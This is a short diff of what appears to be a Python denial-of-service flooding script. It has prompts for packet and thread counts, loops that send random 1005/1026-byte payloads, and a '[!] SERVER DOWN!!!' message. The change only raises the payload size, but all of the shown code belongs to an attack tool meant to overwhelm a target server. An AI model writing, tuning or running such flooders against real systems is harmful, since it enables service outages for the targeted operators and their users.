@@ -52,7 +52,7 @@ times = int(input("[ ====> ] PACKETS : "))
 threads = int(input("[ ====> ] ISI PACKETS : "))
 os.system("clear")
 def run():
-	data = random._urandom(1005)
+	data = random._urandom(1026)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -66,7 +66,7 @@ def run():
 			print("[!] SERVER DOWN!!!")
 
 def run2():
-	data = random._urandom(1005)
+	data = random._urandom(1026)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
